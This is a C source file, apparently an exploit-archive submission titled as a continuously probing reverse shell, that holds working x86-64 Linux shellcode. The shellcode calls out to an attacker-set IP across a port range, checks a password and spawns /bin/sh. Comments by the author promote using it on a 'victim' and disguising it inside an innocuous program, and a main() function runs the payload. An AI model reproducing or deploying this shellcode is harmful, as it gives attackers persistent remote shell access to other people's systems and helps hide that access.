#include <stdio.h>
#include <string.h>

// Exploit Title: [Continuously-Probing Reverse Shell via Socket + port-range + password (172 bytes)]
// Date: [07/10/2016]
// Exploit Author: [CripSlick]
// Tested on: [Kali 2.0]
// Version: [No program being used or exploited; I only relied on syscalls]

//=========================================================================================
// =====================  Why use Da LaCrips Reverse Shell??  =============================

// 1. The victim can lauch the payload and THEN you can connect (unlike
//    every other reverse shell where you must be ready for the connection ahead of time)
// 2. You get multiple ports (that means multiple terminals can run on a single victim)
// 3. If your connection/port gets disconnected, you can accept that port connection right back again
// 4. You will be able to access any linux system disto via syscalls
// 5. You you get a password and easy to change variables
// 6. You can easily link it to an innocuous program sense the terminal closes via fork after launch
//    ENJOY!!
//=========================================================================================

//ShepherdDowling@gmail.com
//OffSec ID: OS-20614
//http://50.112.22.183/

#define IPv4 		"\x0a\x01\x01\x04"	//in forward-byte-order

#define High_Port	"\x8f\x01" //399	//in reverse-byte-order
#define Low_Port 	"\x86\x01" //390	//in reverse-byte-order
// python + import socket + hex(socket.htons(<Port_Number>))

#define Password	"\x6c\x61\x20\x63\x72\x69\x70\x73"  // in forward-byte-order
// Default Password = 'la crips' without quotes
// python + '<password>'[::1].encode('hex')
// you can use complex ascii characters
// example: \x21\x40\x20\x3C\x52\x7C\x70\x24 = !@ <R|p$

// Port-Note 1/2: 	your Low_port will NOT be hit,
// 					only the 2nd lowest to the highest will return to you
//					example of using only one port
//					High_Port = 399 & Low_Port = 389 = only port 399

// Port-Note 2/2:	If you have over a hunder ports to prob, there may be some delay


unsigned char code[] =

"\x48\x31\xff\x48\xf7\xe7\x57\x66\x68"High_Port"\x5b\x48\xff\xcb\x66\x81\xfb"Low_Port"\x75\x04\x66\xbb"High_Port"\x6a\x39\x58\x48\x31\xff\x0f\x05\x48\x31\xff\x48\x39\xf8\x74\x77\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x97\x86\xdf\x6a\x02\x66\x89\x5c\x24\x02\xc7\x44\x24\x04"IPv4"\x86\xdf\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x89\xc7\x48\x89\xc6\x48\x8d\x74\x24\xf0\x6a\x10\x5a\x0f\x05\x48\xb8"Password"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x56\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05\x48\x31\xff\x48\xf7\xe7\xe9\x60\xff\xff\xff"

;

int main ()
{
	// I make sure there are no nulls
	// The string count will terminate at the first \x00
	printf("The Shellcode is %d Bytes Long\n", strlen(code));

	// Next I throw 0xAAAAAAAA into every register before shellcode execution
	// This ensures that the shellcode will run in any circumstance

	__asm__("mov $0xAAAAAAAAAAAAAAAA, %rax\n\t"
		"mov %rax, %rbx\n\t" "mov %rax, %rcx\n\t" "mov %rax, %rdx\n\t"
		"mov %rax, %rsi\n\t" "mov %rax, %rdi\n\t" "mov %rax, %rbp\n\t"
		"mov %rax, %r10\n\t" "mov %rax, %r11\n\t" "mov %rax, %r12\n\t"
		"mov %rax, %r13\n\t" "mov %rax, %r14\n\t" "mov %rax, %r15\n\t"
		"call code");
	return 0;
}